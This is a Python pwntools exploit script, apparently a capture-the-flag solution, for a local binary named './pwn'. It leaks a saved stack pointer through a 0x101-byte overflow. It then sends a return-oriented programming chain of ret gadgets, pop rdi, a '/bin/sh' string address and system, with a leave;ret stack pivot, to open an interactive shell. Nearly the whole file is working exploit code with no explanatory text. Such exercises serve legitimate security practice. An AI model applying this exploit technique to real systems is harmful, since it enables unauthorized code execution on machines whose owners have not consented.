

from pwn import *
from LibcSearcher import *
from pwncli import *
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)

context(os='linux', arch='amd64', log_level='debug') #正常
p=process('./pwn')
e=ELF('./pwn')

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)

def debug():
    attach(p)
    pause()

#0x00000000004011d8 : pop rdi ; ret
pop_rdi=0x4011d8
#0x000000000040127f : leave ; ret
leave_ret=0x00040127f
#0x000000000040101a : ret
ret=0x000040101a 
#0x0000000000402097 : /bin/sh
binshaddr=0x00402097 

systemaddr=0x4011C8

p.recv()
p.send(b'a'*0x101)
p.recvuntil(b'a'*0x101)
rbp=u64(p.recv(5).ljust(8,b'\x00'))
rbp=rbp<<8
print(hex(rbp))
datapo=rbp-0x40
print(hex(datapo))
payload=p64(ret)*0x1d+p64(pop_rdi)+p64(binshaddr)+p64(systemaddr)+p64(datapo)+p64(leave_ret)
print(b'payload_len',hex(len(payload)))
p.recv()
p.send(payload)


p.interactive() 